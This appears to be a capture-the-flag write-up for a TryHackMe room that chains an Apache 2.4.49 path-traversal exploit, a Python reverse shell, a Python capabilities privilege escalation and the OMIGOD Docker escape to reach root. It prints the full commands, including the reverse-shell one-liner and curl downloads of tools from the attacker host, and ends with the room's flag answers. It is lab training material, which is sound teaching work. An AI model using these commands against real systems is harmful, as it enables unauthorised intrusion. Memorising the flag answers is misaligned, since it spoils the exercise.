# Oh My WebServer - Medium

```shell
nmap -T4 -p- -A -Pn -v 10.10.174.97

#apache 2.4.49 exploit
python3 CVE-2021-41773.py -t 10.10.174.97
#gives limited shell

#setup another listener in new tab
nc -nvlp 4444

#in limited shell
#run python reverse-shell command
export RHOST="10.14.31.212";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

#we get shell on our listener
whoami
#daemon

python3 -c 'import pty;pty.spawn("/bin/bash")'

#we can check directories such as /opt, /var/www, /home
#but we do not get anything

#in attacker machine
python3 -m http.server

#in reverse shell
cd /tmp

#we do not have wget, we can use curl
curl http://10.14.31.212:8000/linpeas.sh --output linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
#this shows python has capabilities set
#confirm using getcap command
getcap -r / 2>/dev/null

#exploit from GTFObins
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'

#we have root shell now

id
#root

ls -la /root
#this has user flag

cat /root/user.txt

#we now need to check root flag
find / -name root.txt 2>/dev/null
#we do not get root flag

#.dockerenv in /
#random hostname
ifconfig
#and ip is 172.17.0.2

#this shows we are in docker environment

#we can scan adjacent machine 172.17.0.1
#for open ports using nmap

#get nmap static binary from attacker machine
curl http://10.14.31.212:8000/nmap --output nmap

chmod +x nmap

./nmap -T4 -p- 172.17.0.1

#shows closed port 5985 and open port 5986
#googling these show 'omigod' exploit
#cve-2021-38647 exploit from github
curl http://10.14.31.212:8000/CVE-2021-38647.py --output cve.py

/usr/bin/python3 cve.py -t 172.17.0.1 -p 5986 -c id

/usr/bin/python3 cve.py -t 172.17.0.1 -p 5986 -c 'find / -name root.txt 2>/dev/null'

#root flag
/usr/bin/python3 cve.py -t 172.17.0.1 -p 5986 -c 'cat /root/root.txt'
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.49

* Basic enumeration shows that the version of Apache webserver is 2.4.49.

* When Googled, we find out that this version has a RCE exploit associated with it.

* We can download an exploit from GitHub; running the Python script with the required parameter gets us a limited reverse shell.

* We can setup another listener, and use a reverse-shell one-liner to migrate our shell to the listener.

* Now, we have reverse shell as 'daemon' - we need to check for privesc.

* Using ```linpeas.sh```, we can see that there are capabilities set for Python 3.7

* We can confirm this using the ```getcap``` command.

* GTFObins has a neat exploit for set capabilities in Python - we use that to get shell as root.

* Now, as this is a web server, there are no users in home directory.

* Checking the root folder gives us the user flag.

* Now, there is a ```.dockerenv``` file in root directory; furthermore, ```ifconfig``` shows our IP is 172.17.0.2, and finally we have a random string as hostname.

* These three indicators show that we are in a Docker environment - we now need to check for ways to escape this.

* We can upload a static binary of ```nmap``` to victim machine and check for open ports.

* Running the scan against all ports shows that port 5985 is closed and 5986 is open.

* Googling '5986 port open docker' leads us to 'OMIGOD' exploit, known by CVE-2021-38647.

* This has a Python script for exploitation - we can download it from GitHub and upload it to victim machine.

* Running this script with the required parameters, we can search for the root flag, and print it.

```markdown
1. What is the user flag? - THM{eacffefe1d2aafcc15e70dc2f07f7ac1}

2. What is the root flag? - THM{7f147ef1f36da9ae29529890a1b6011f}
```
